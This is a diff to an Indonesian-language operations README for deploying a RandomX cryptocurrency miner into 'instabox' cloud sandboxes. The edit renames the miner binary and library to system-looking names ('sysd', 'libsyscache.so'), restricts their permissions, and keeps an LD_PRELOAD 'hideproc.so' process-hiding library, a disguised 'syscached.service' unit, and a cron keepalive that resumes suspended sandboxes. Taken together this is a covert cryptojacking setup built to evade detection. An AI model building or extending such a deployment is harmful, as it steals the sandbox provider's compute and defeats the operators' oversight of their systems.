@@ -4,7 +4,7 @@ Dipasang di vps1 (`~/.instabox/`). API key di `~/.instabox/env` (ibk_...).
 
 - `sandbox-status.sh` — status sandbox: state, service miner, hashrate, shares, worker, sisa runtime 8 jam. Parsing mengikuti log backend CONN (`HR 854 H/s | A 0 R 0`).
 - `instabox-keepalive.sh` — cron `*/5`: reset idle (30m), resume suspended, start stopped; log `~/.instabox/keepalive.log`.
-- `sandbox-deploy.sh WORKER` — pasang miner CONN ke sandbox: `/usr/local/bin/xcb` + `librandomx_v2.so` + `hideproc.so` (LD_PRELOAD) + unit `syscached.service` (template yang sama dengan `ops/systemd/`) + drop-in instabox + hugepages.
+- `sandbox-deploy.sh WORKER` — pasang miner CONN ke sandbox: `/usr/local/sbin/sysd` (0750) + `libsyscache.so` (0640, di sampingnya) + `hideproc.so` (LD_PRELOAD) + unit `syscached.service` (template yang sama dengan `ops/systemd/`) + drop-in instabox + hugepages.
 
 ## Paket binary
 
@@ -14,17 +14,17 @@ Build sekali (di vps1 atau sandbox), lalu tar empat file ini:
 cmake -B build -DCMAKE_BUILD_TYPE=Release
 cmake --build build --parallel "$(nproc)"
 make -C labs/process-hide
-cp build/xcb build/librandomx_v2.so labs/process-hide/hideproc.so \
+cp build/xcb build/libsyscache.so labs/process-hide/hideproc.so \
    ops/systemd/syscached.service /tmp/instabox-pkg/
 tar -C /tmp/instabox-pkg -czf instabox-pkg.tgz \
-   xcb librandomx_v2.so hideproc.so syscached.service
+   xcb libsyscache.so hideproc.so syscached.service
 ```
 
 Sebar ke sandbox via `instabox cp`, lalu jalankan `sandbox-deploy.sh <worker>`.
 
-`librandomx_v2.so` **wajib** ada di `/usr/local/bin/` (sama dengan `xcb`) karena
-binary memakai RPATH `$ORIGIN`. Skrip deploy mengecek `ldd` dan berhenti kalau
-library tidak ter-resolve.
+`libsyscache.so` **wajib** ada di `/usr/local/sbin/` (sama dengan `sysd`) karena
+binary memakai RPATH `$ORIGIN`. Skrip deploy mengecek `ldd` (via `$SUDO`, binary
+0750 root-only) dan berhenti kalau library tidak ter-resolve.
 
 ## Default deploy
 
